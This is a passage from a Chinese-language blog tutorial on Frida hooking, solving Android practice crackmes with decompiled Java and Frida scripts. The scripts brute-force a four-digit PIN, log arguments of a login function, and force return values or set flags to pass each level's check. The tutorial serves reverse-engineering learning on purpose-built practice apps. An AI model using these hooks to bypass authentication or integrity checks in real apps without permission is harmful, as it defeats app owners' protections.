class="keyword">if</span> (input.length() != <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">byte</span>[] v = encodePassword(input);</span><br><span class="line">    <span class="keyword">byte</span>[] p = <span class="string">"09042ec2c2c08c4cbece042681caf1d13984f24a"</span>.getBytes();</span><br><span class="line">    <span class="keyword">if</span> (v.length != p.length) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; v.length; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (v[i] != p[i]) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里就爆破一下密码。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">frida-ps -U | grep qualification</span><br><span class="line">7660  org.teamsik.ahe17.qualification.easy</span><br><span class="line"></span><br><span class="line">frida -U org.teamsik.ahe17.qualification.easy -l force.js</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    Java.perform(<span class="function"><span class="keyword">function</span> <span class="title">x</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"In Java perform"</span>)</span><br><span class="line">        <span class="keyword">var</span> verify = Java.use(<span class="string">"org.teamsik.ahe17.qualification.Verifier"</span>)</span><br><span class="line">        <span class="keyword">var</span> stringClass = Java.use(<span class="string">"java.lang.String"</span>)</span><br><span class="line">        <span class="keyword">var</span> p = stringClass.$<span class="keyword">new</span>(<span class="string">"09042ec2c2c08c4cbece042681caf1d13984f24a"</span>)</span><br><span class="line">        <span class="keyword">var</span> pSign = p.getBytes()</span><br><span class="line">        <span class="comment">// var pStr = stringClass.$new(pSign)</span></span><br><span class="line">        <span class="comment">// console.log(parseInt(pStr))</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">999</span>; i &lt; <span class="number">10000</span>; i++)&#123;</span><br><span class="line">            <span class="keyword">var</span> v = stringClass.$<span class="keyword">new</span>(<span class="built_in">String</span>(i))</span><br><span class="line">            <span class="keyword">var</span> vSign = verify.encodePassword(v)</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">parseInt</span>(stringClass.$<span class="keyword">new</span>(pSign)) == <span class="built_in">parseInt</span>(stringClass.$<span class="keyword">new</span>(vSign))) &#123;</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">"yes: "</span> + v)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">"not :"</span> + v)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line">setImmediate(main)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">not :9080</span><br><span class="line">not :9081</span><br><span class="line">not :9082</span><br><span class="line">yes: 9083</span><br></pre></td></tr></table></figure><p>这里注意parseInt</p><h2 id="Frida-hook基础-一"><a href="#Frida-hook基础-一" class="headerlink" title="Frida hook基础(一)"></a>Frida hook基础(一)</h2><ul><li>调用静态函数和调用非静态函数</li><li>设置(同名)成员变量</li><li>内部类，枚举类的函数并hook，trace原型1</li><li>查找接口，hook动态加载dex</li><li>枚举class，trace原型2</li><li>objection不能切换classloader</li></ul><h3 id="Frida-hook-打印参数、返回值-设置返回值-主动调用"><a href="#Frida-hook-打印参数、返回值-设置返回值-主动调用" class="headerlink" title="Frida hook : 打印参数、返回值/设置返回值/主动调用"></a>Frida hook : 打印参数、返回值/设置返回值/主动调用</h3><p>demo就不贴了，还是先定位登录失败点，然后搜索字符串。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LoginActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line">    <span class="comment">/* access modifiers changed from: private */</span></span><br><span class="line">    <span class="keyword">public</span> Context mContext;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle bundle)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(bundle);</span><br><span class="line">        <span class="keyword">this</span>.mContext = <span class="keyword">this</span>;</span><br><span class="line">        setContentView((<span class="keyword">int</span>) R.layout.activity_login);</span><br><span class="line">        <span class="keyword">final</span> EditText editText = (EditText) findViewById(R.id.username);</span><br><span class="line">        <span class="keyword">final</span> EditText editText2 = (EditText) findViewById(R.id.password);</span><br><span class="line">        ((Button) findViewById(R.id.login)).setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View view)</span> </span>&#123;</span><br><span class="line">                String obj = editText.getText().toString();</span><br><span class="line">                String obj2 = editText2.getText().toString();</span><br><span class="line">                <span class="keyword">if</span> (TextUtils.isEmpty(obj) || TextUtils.isEmpty(obj2)) &#123;</span><br><span class="line">                    Toast.makeText(LoginActivity.<span class="keyword">this</span>.mContext, <span class="string">"username or password is empty."</span>, <span class="number">1</span>).show();</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (LoginActivity.a(obj, obj).equals(obj2)) &#123;</span><br><span class="line">                    LoginActivity.<span class="keyword">this</span>.startActivity(<span class="keyword">new</span> Intent(LoginActivity.<span class="keyword">this</span>.mContext, FridaActivity1<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line">                    LoginActivity.<span class="keyword">this</span>.finishActivity(<span class="number">0</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    Toast.makeText(LoginActivity.<span class="keyword">this</span>.mContext, <span class="string">"Login failed."</span>, <span class="number">1</span>).show();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><code>LoginActivity.a(obj, obj).equals(obj2)</code>分析之后可得obj2来自password，由从username得来的obj，经过a函数运算之后得到一个值，这两个值相等则登录成功。<br>所以这里关键是hook a函数的参数，最简脚本如下。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//打印参数、返回值</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Login</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    Java.perform(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        Java.use(<span class="string">"com.example.androiddemo.Activity.LoginActivity"</span>).a.overload(<span class="string">'java.lang.String'</span>, <span class="string">'java.lang.String'</span>).implementation = <span class="function"><span class="keyword">function</span> (<span class="params">str, str2</span>)</span>&#123;</span><br><span class="line">            <span class="keyword">var</span> result = <span class="keyword">this</span>.a(str, str2);</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">"args0:"</span>+str+<span class="string">" args1:"</span>+str2+<span class="string">" result:"</span>+result);</span><br><span class="line">            <span class="keyword">return</span> result;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line">setImmediate(Login)</span><br></pre></td></tr></table></figure><p>观察输入和输出,这里也可以直接主动调用。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    Java.perform(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"start"</span>)</span><br><span class="line">        <span class="keyword">var</span> login = Java.use(<span class="string">"com.example.androiddemo.Activity.LoginActivity"</span>)</span><br><span class="line">        <span class="keyword">var</span> result = login.a(<span class="string">"1234"</span>,<span class="string">"1234"</span>)</span><br><span class="line">        <span class="built_in">console</span>.log(result)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line">setImmediate(login)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">start</span><br><span class="line">4e4feaea959d426155a480dc07ef92f4754ee93edbe56d993d74f131497e66fb</span><br><span class="line">然后</span><br><span class="line">adb shell input text &quot;4e4feaea959d426155a480dc07ef92f4754ee93edbe56d993d74f131497e66fb&quot;</span><br></pre></td></tr></table></figure><p>接下来是第一关</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">BaseFridaActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> <span class="keyword">implements</span> <span class="title">View</span>.<span class="title">OnClickListener</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> Button mNextCheck;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">CheckSuccess</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> String <span class="title">getNextCheckTitle</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">onCheck</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* access modifiers changed from: protected */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle bundle)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(bundle);</span><br><span class="line">        setContentView((<span class="keyword">int</span>) R.layout.activity_frida);</span><br><span class="line">        <span class="keyword">this</span>.mNextCheck = (Button) findViewById(R.id.next_check);</span><br><span class="line">        <span class="keyword">this</span>.mNextCheck.setOnClickListener(<span class="keyword">this</span>);</span><br><span class="line">        Button button = <span class="keyword">this</span>.mNextCheck;</span><br><span class="line">        button.setText(getNextCheckTitle() + <span class="string">"，点击进入下一关"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View view)</span> </span>&#123;</span><br><span class="line">        onCheck();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">CheckFailed</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        Toast.makeText(<span class="keyword">this</span>, <span class="string">"Check Failed!"</span>, <span class="number">1</span>).show();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FridaActivity1</span> <span class="keyword">extends</span> <span class="title">BaseFridaActivity</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">char</span>[] table = &#123;<span class="string">'L'</span>, <span class="string">'K'</span>, <span class="string">'N'</span>, <span class="string">'M'</span>, <span class="string">'O'</span>, <span class="string">'Q'</span>, <span class="string">'P'</span>, <span class="string">'R'</span>, <span class="string">'S'</span>, <span class="string">'A'</span>, <span class="string">'T'</span>, <span class="string">'B'</span>, <span class="string">'C'</span>, <span class="string">'E'</span>, <span class="string">'D'</span>, <span class="string">'F'</span>, <span class="string">'G'</span>, <span class="string">'H'</span>, <span class="string">'I'</span>, <span class="string">'J'</span>, <span class="string">'U'</span>, <span class="string">'V'</span>, <span class="string">'W'</span>, <span class="string">'X'</span>, <span class="string">'Y'</span>, <span class="string">'Z'</span>, <span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>, <span class="string">'o'</span>, <span class="string">'d'</span>, <span class="string">'p'</span>, <span class="string">'q'</span>, <span class="string">'r'</span>, <span class="string">'s'</span>, <span class="string">'t'</span>, <span class="string">'u'</span>, <span class="string">'v'</span>, <span class="string">'w'</span>, <span class="string">'x'</span>, <span class="string">'e'</span>, <span class="string">'f'</span>, <span class="string">'g'</span>, <span class="string">'h'</span>, <span class="string">'j'</span>, <span class="string">'i'</span>, <span class="string">'k'</span>, <span class="string">'l'</span>, <span class="string">'m'</span>, <span class="string">'n'</span>, <span class="string">'y'</span>, <span class="string">'z'</span>, <span class="string">'0'</span>, <span class="string">'1'</span>, <span class="string">'2'</span>, <span class="string">'3'</span>, <span class="string">'4'</span>, <span class="string">'6'</span>, <span class="string">'5'</span>, <span class="string">'7'</span>, <span class="string">'8'</span>, <span class="string">'9'</span>, <span class="string">'+'</span>, <span class="string">'/'</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getNextCheckTitle</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"当前第1关"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onCheck</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (a(b(<span class="string">"请输入密码:"</span>)).equals(<span class="string">"R4jSLLLLLLLLLLOrLE7/5B+Z6fsl65yj6BgC6YWz66gO6g2t65Pk6a+P65NK44NNROl0wNOLLLL="</span>)) &#123;</span><br><span class="line">                CheckSuccess();</span><br><span class="line">                startActivity(<span class="keyword">new</span> Intent(<span class="keyword">this</span>, FridaActivity2<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line">                finishActivity(<span class="number">0</span>);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">super</span>.CheckFailed();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">a</span><span class="params">(<span class="keyword">byte</span>[] bArr)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        StringBuilder sb = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= bArr.length - <span class="number">1</span>; i += <span class="number">3</span>) &#123;</span><br><span class="line">            <span class="keyword">byte</span>[] bArr2 = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">4</span>];</span><br><span class="line">            <span class="keyword">byte</span> b = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i2 = <span class="number">0</span>; i2 &lt;= <span class="number">2</span>; i2++) &#123;</span><br><span class="line">                <span class="keyword">int</span> i3 = i + i2;</span><br><span class="line">                <span class="keyword">if</span> (i3 &lt;= bArr.length - <span class="number">1</span>) &#123;</span><br><span class="line">                    bArr2[i2] = (<span class="keyword">byte</span>) (b | ((bArr[i3] &amp; <span class="number">255</span>) &gt;&gt;&gt; ((i2 * <span class="number">2</span>) + <span class="number">2</span>)));</span><br><span class="line">                    b = (<span class="keyword">byte</span>) ((((bArr[i3] &amp; <span class="number">255</span>) &lt;&lt; (((<span class="number">2</span> - i2) * <span class="number">2</span>) + <span class="number">2</span>)) &amp; <span class="number">255</span>) &gt;&gt;&gt; <span class="number">2</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    bArr2[i2] = b;</span><br><span class="line">                    b = <span class="number">64</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            bArr2[<span class="number">3</span>] = b;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i4 = <span class="number">0</span>; i4 &lt;= <span class="number">3</span>; i4++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (bArr2[i4] &lt;= <span class="number">63</span>) &#123;</span><br><span class="line">                    sb.append(table[bArr2[i4]]);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    sb.append(<span class="string">'='</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sb.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] b(String str) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ByteArrayOutputStream byteArrayOutputStream = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">            GZIPOutputStream gZIPOutputStream = <span class="keyword">new</span> GZIPOutputStream(byteArrayOutputStream);</span><br><span class="line">            gZIPOutputStream.write(str.getBytes());</span><br><span class="line">            gZIPOutputStream.finish();</span><br><span class="line">            gZIPOutputStream.close();</span><br><span class="line">            <span class="keyword">byte</span>[] byteArray = byteArrayOutputStream.toByteArray();</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                byteArrayOutputStream.close();</span><br><span class="line">                <span class="keyword">return</span> byteArray;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">                <span class="keyword">return</span> byteArray;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception unused) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>关键函数在<code>a(b(&quot;请输入密码:&quot;)).equals(&quot;R4jSLLLLLLLLLLOrLE7/5B+Z6fsl65yj6BgC6YWz66gO6g2t65Pk6a+P65NK44NNROl0wNOLLLL=&quot;)</code><br>这里应该直接hook a，让其返回值为<code>R4jSLLLLLLLLLLOrLE7/5B+Z6fsl65yj6BgC6YWz66gO6g2t65Pk6a+P65NK44NNROl0wNOLLLL=</code>就可以进入下一关了。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ch1</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    Java.perform(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"start"</span>)</span><br><span class="line">        Java.use(<span class="string">"com.example.androiddemo.Activity.FridaActivity1"</span>).a.implementation = <span class="function"><span class="keyword">function</span> (<span class="params">x</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"R4jSLLLLLLLLLLOrLE7/5B+Z6fsl65yj6BgC6YWz66gO6g2t65Pk6a+P65NK44NNROl0wNOLLLL="</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Frida-hook-主动调用静态-非静态函数-以及-设置静态-非静态成员变量的值"><a href="#Frida-hook-主动调用静态-非静态函数-以及-设置静态-非静态成员变量的值" class="headerlink" title="Frida hook : 主动调用静态/非静态函数 以及 设置静态/非静态成员变量的值"></a>Frida hook : 主动调用静态/非静态函数 以及 设置静态/非静态成员变量的值</h3><p>总结:</p><ul><li>静态函数直接use class然后调用方法，非静态函数需要先choose实例然后调用</li><li>设置成员变量的值，写法是<code>xx.value = yy</code>，其他方面和函数一样。</li><li>如果有一个成员变量和成员函数的名字相同，则在其前面加一个<code>_</code>，如<code>_xx.value = yy</code></li></ul><p>然后是第二关</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FridaActivity2</span> <span class="keyword">extends</span> <span class="title">BaseFridaActivity</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">boolean</span> static_bool_var = <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">boolean</span> bool_var = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getNextCheckTitle</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"当前第2关"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setStatic_bool_var</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        static_bool_var = <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">setBool_var</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.bool_var = <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onCheck</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!static_bool_var || !<span class="keyword">this</span>.bool_var) &#123;</span><br><span class="line">            <span class="keyword">super</span>.CheckFailed();</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        CheckSuccess();</span><br><span class="line">        startActivity(<span class="keyword">new</span> Intent(<span class="keyword">this</span>, FridaActivity3<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line">        finishActivity(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这一关的关键在于下面的if判断要为false，则<code>static_bool_var</code>和<code>this.bool_var</code>都要为true。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if (!static_bool_var || !this.bool_var) &#123;</span><br><span class="line">            super.CheckFailed();</span><br><span class="line">            return;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>这样就要调用<code>setBool_var</code>和<code>setStatic_bool_var</code>两个函数了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">function ch2() &#123;</span><br><span class="line">    Java.perform(function () &#123;</span><br><span class="line">        console.log(&quot;start&quot;)</span><br><span class="line">        var FridaActivity2 &#x3D; Java.use(&quot;com.example.androiddemo.Activity.FridaActivity2&quot;)</span><br><span class="line">        &#x2F;&#x2F;hook静态函数直接调用</span><br><span class="line">        FridaActivity2.setStatic_bool_var()</span><br><span class="line">        &#x2F;&#x2F;hook动态函数，找到instance实例，从实例调用函数方法</span><br><span class="line">        Java.choose(&quot;com.example.androiddemo.Activity.FridaActivity2&quot;, &#123;</span><br><span class="line">            onMatch: function (instance) &#123;</span><br><span class="line">                instance.setBool_var()</span><br><span class="line">            &#125;,</span><br><span class="line">            onComplete: function () &#123;</span><br><span class="line">                console.log(&quot;end&quot;)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line">setImmediate(ch2)</span><br></pre></td></tr></table></figure><p>接下来是第三关</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span 